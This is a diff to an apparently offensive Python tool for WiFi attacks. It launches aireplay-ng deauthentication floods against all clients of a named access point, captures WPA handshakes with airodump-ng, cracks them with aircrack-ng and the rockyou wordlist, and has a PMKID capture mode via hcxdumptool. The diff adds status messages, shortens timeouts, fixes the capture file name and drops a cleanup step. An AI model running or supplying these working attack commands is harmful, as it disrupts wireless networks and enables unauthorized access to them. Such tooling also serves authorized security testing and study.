@@ -1,9 +1,9 @@
+from colorama import Fore
 import sys
 import os
 import subprocess
 import time
 import signal
-from colorama import Fore
 
 
 def ctrl_c(signum, frame):
@@ -142,17 +142,23 @@ def attack_func(network_interface, attack_mode):
             process.kill()
         get_current_path = subprocess.check_output('pwd').strip()
         set_path = f'{get_current_path.decode()}/Capture'
-        os.system(f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
+        get_colours("\n[*] Waiting 65 Seconds for the Handshake", 'cyan')
+        os.system(
+            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
         time.sleep(5)
         os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        get_colours("\n[*] Sending deauthentication packets to victim router", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
-        time.sleep(70)  # Wait for 70 seconds for handshake.
+        time.sleep(65)
         for line in out.splitlines():
             if b'xterm' in line:
                 pid = int(line.split(None, 1)[0])
                 os.kill(pid, signal.SIGKILL)
-        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}.cap &")
+        subprocess.run(["clear"])
+        get_colours("\n[*] Clearing processes", 'red')
+        time.sleep(2)
+        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}-01.cap &")
         os.system('clear')
         quit_program()
     # PKMID Attack Mode
@@ -166,7 +172,7 @@ def attack_func(network_interface, attack_mode):
         process = subprocess.Popen(
             ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
         try:
-            process.wait(timeout=70)  # Time for the process
+            process.wait(timeout=60)  # Time for the process
         except subprocess.TimeoutExpired:
             print('\n[!] Timed out - killing process ID - ', process.pid)
             process.kill()
@@ -199,8 +205,6 @@ def attack_func(network_interface, attack_mode):
 
 
 def quit_program():
-    get_colours("\n[!] Clearing Temporary files..", "red")
-    os.system("rm -rf Cap*")
     time.sleep(2)
     get_colours("\n[!] Exiting the program...", "blue")
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
@@ -229,6 +233,8 @@ def check_parms():
                     else:
                         check_deps()  # Check for neccesary program to run this script.
                 else:
+                    print("d")
+                    print(sys.argv[4])
                     get_colours("\nSelect a valid attack Mode (Handshake / PKMID)", "red")
                     print(Fore.WHITE)
             else:
